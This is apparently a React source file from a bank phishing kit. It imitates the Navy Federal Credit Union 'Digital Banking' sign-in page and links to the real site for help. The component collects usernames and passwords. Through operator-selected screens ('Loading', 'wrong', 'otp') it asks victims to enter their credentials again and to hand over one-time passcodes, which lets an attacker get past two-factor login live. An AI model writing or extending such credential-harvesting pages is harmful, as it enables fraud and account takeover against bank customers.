import { useState } from "react";
import useForms from "../../../../../../../hooks/useForms";
import { bankDetailsInfo, navDetails1, navyDetails } from "../../bankDetails";
import BankingHeader from "./BankingHeader";
import { FaLock, FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import clsx from "clsx";
import { HiQuestionMarkCircle } from "react-icons/hi2";
import { Link } from "react-router-dom";

const NavyFederal = ({
  handleCancel,
  bankName,
  handleSubmit,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  mainCancel,
}) => {
  const { formState, handleChange } = useForms(bankDetailsInfo);
  const [otp, setOtp] = useState("");
  const [showPassword, setshowPassword] = useState(false);

  const onSumbitForm = () => {
    const newItems = {
      ...formState,
      bankName: bankName,
    };

    handleSubmit(newItems);
  };

  const handleVerifiedOtp = () => {
    setOtpOpen(true);
  };

  return (
    <div>
      <div>
        <BankingHeader
          text="Navy Federal Credit Union - Our Member are the Mission"
          handleCancel={handleCancel}
        />
        <header>
          <div>
            <div>img</div>
            <ul>
              {navyDetails.map((navy) => (
                <li key={navy.id}>{navy.name}</li>
              ))}
            </ul>
          </div>
          <nav>
            {navDetails1.map((navd) => (
              <div key={navd.id}>
                <span>{navd.icon && <navd.icon />}</span>
                <span>{navd.name}</span>
              </div>
            ))}
          </nav>
        </header>
        <div>
          <h3>Welcome to Digital Banking</h3>
          <div>
            <div>
              <FaLock />
              <span>Sign In</span>
            </div>
            <div className={clsx(allBankOpen ? "hidden" : "block")}>
              <div>
                <label>
                  Username <HiQuestionMarkCircle />
                </label>
                <input
                  type="text"
                  value={formState.username}
                  onChange={handleChange}
                  name="username"
                />
              </div>
              <div>
                <label>Password</label>
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                />
                <span onClick={() => setshowPassword((prevShow) => !prevShow)}>
                  {showPassword ? <FaRegEyeSlash /> : <FaRegEye />}
                </span>
              </div>
              <button onClick={onSumbitForm}>Sign In</button>
            </div>

            <Link to="https://www.navyfederal.org/">Sign In Help</Link>
          </div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <button>
                {whatToShowDetails.map((what) => (
                  <p key={what.id} onClick={() => handleSelectedId(what)}>
                    {what.name}
                  </p>
                ))}
              </button>
              <button onClick={handleSelectSubmit}>Submit</button>
              <div>
                {selectedPath.name === "Loading" && <p>{selectedPath.body}</p>}
                {selectedPath.name === "wrong" && (
                  <>
                    <h3>{selectedPath.body}</h3>
                    <div>
                      <div>
                        <label>User ID</label>
                        <input
                          type="text"
                          value={formState.username}
                          name="username"
                          onChange={handleChange}
                        />
                      </div>
                      <div>
                        <label>Password</label>
                        <input
                          type="password"
                          value={formState.password}
                          name="password"
                          onChange={handleChange}
                        />
                      </div>
                      <div>
                        <button onClick={onSumbitForm}>Submit</button>
                        <button>Cancel</button>
                      </div>
                    </div>
                  </>
                )}
                {selectedPath.name === "otp" && (
                  <>
                    <h3>{selectedPath.body}</h3>
                    <div>
                      <input
                        type="text"
                        onChange={(e) => setOtp(e.target.value)}
                        value={otp}
                      />
                      <button onClick={handleVerifiedOtp}>Verify</button>
                    </div>
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <button>
                {otpInfo.map((what) => (
                  <p key={what.id} onClick={() => handleSelectedOtp(what)}>
                    {what.name}
                  </p>
                ))}
              </button>
              <button onClick={handleSubmitOtp}>Submit</button>
              <div>
                {selectedOtp.name === "Loading" && <p>{selectedOtp.body}</p>}
                {selectedOtp.name === "wrong" && (
                  <>
                    <h3>{selectedOtp.body}</h3>
                    <div>
                      <input
                        type="text"
                        onChange={(e) => setOtp(e.target.value)}
                        value={otp}
                      />
                      <button onClick={handleVerifiedOtp}>Verify</button>
                    </div>
                  </>
                )}
                {selectedOtp.name === "otp" && (
                  <>
                    <h3>{selectedOtp.body}</h3>
                    <button onClick={() => mainCancel(false)}>Cancel</button>
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

export default NavyFederal;
